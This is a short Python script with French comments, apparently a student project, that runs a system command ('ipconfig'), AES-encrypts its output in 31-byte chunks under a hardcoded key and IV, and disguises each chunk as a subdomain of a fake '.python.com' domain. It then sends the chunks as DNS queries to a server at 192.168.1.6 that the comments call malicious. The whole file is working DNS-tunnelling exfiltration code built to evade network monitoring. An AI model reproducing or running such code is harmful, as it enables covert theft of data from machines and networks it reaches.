from dns import resolver
import subprocess
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# # /!\ MODIFIER @ HOST AVANT D'EXECUTER LE PROGRAMME
# Adresse et port du serveur DNS malicieux
# 192.168.1.6:53
HOST = '192.168.1.6'
PORT = 53
KEY = b'267eAs?594f6C:5m'
IV = b'a5E8s9!AF272344_'

def encrypt_aes_cbc(key, iv, plaintext):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
    return base64.b64encode(ciphertext).decode()

def decrypt_aes_cbc(key, iv, ciphertext):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = cipher.decrypt(base64.b64decode(ciphertext))
    
    return unpad(decrypted_data, AES.block_size).decode()

# division des données retournées par subprocess
# en bloc de 31 octets, rassemblés dans un tableau
def chunk(data):
    chunk_size = 31
    chunks = []

    # Iterate over the data in chunk_size intervals
    # 
    for i in range(0, len(data), chunk_size):
        # Obtention du chunk actuel
        chunk = data[i:i+chunk_size]

        # encodage en base64
        #encoded_chunk = base64.b64encode(chunk.encode()).decode()

        # ajout du faux domaine ".python.com"
        encoded_chunk = encrypt_aes_cbc(KEY, IV, chunk)

        # à faire chiffrer en AES (CTR ou CBC)
        encoded_chunk += ".python.com"

        # chaque chunk est stocké dans un tableau
        # pour créer une requête par index
        # nécessaire pour bypass la limite de 63 octets ("sous-domaine")
        # et 255 octets pour le datagramme (domain au complet)
        chunks.append(encoded_chunk)

    return chunks


def send_dns(data):
    
    # on parcours l'ensemble du tableau
    for requests in data:

        # chaque index est une requête DNS
        answer = res.resolve(requests.strip(), 'A')
        
        # affichage de l'adresse IP en réponse
        # (à retirer pour le projet final)
        for ipval in answer:
            print('IP', ipval.to_text())

# test avec ipconfig
command = "ipconfig"
process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
output_binary, err = process.communicate()

# conversion en string
output_string = output_binary.decode()

# chunk du retour subprocess
data = chunk(output_string)
# affichage du tableau (debug à supprimer)
print(data)

# Créer une instance de resolver
res = resolver.Resolver()

# Spécifier le serveur DNS
res.nameservers = [HOST]
res.port = PORT

# envoie de la donnée au serveur
send_dns(data)
